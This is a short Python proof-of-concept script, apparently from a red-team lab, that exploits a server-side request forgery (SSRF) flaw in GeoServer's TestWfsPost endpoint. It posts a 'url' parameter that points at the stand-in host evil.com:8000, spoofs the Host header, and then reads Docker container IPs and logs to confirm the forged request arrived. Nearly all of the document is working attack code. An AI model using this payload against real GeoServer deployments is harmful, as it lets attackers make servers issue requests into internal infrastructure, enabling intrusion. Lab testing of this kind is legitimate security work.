# -*- coding: utf-8 -*-
"""RT-4 GeoServer final: POST-body SSRF variant + attribution."""
import json
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18082"
s = requests.Session()
s.trust_env = False
s.verify = False

# POST-type SSRF: body param makes GeoServer issue an upstream POST to infra
r = s.post(BASE + "/geoserver/TestWfsPost",
           data={"url": "http://evil.com:8000/rt/rt4_geo_post_b",
                 "body": "rt4=geoserver-ssrf-post"},
           headers={"Host": "evil.com:8000"}, timeout=60)
print("[*] POST-body SSRF -> HTTP %s | %s" % (r.status_code, r.text[:200].replace("\n", " ")))

# attribution: geoserver container IPs
r = subprocess.run(["docker", "inspect", "multi-round-lab-geoserver-1", "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}"],
                   capture_output=True, text=True)
print("[*] geoserver IPs:", r.stdout.strip())

r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "2m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "rt4_geo" in line:
        print("[infra] " + line)
